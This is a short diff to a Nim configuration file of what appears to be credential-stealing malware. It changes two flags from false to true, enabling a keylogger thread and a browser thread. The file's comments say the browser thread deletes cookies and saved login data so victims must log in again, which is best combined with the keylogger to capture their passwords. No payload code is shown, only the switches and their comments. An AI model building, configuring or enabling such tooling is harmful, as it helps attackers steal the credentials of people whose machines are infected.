@@ -2,13 +2,13 @@
 ## used by the program
 
 ## keyloggerThread is used for logging key presses
-const USE_KEYLOGGER_THREAD*: bool = false
+const USE_KEYLOGGER_THREAD*: bool = true
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
 ## best used alongside keyloggerThread
 ## DEFAULT: true
-const USE_BROWSER_THREAD*: bool = false
+const USE_BROWSER_THREAD*: bool = true
 
 ## when `true` browserThread will remove cookies
 ## and other files instead of renaming them
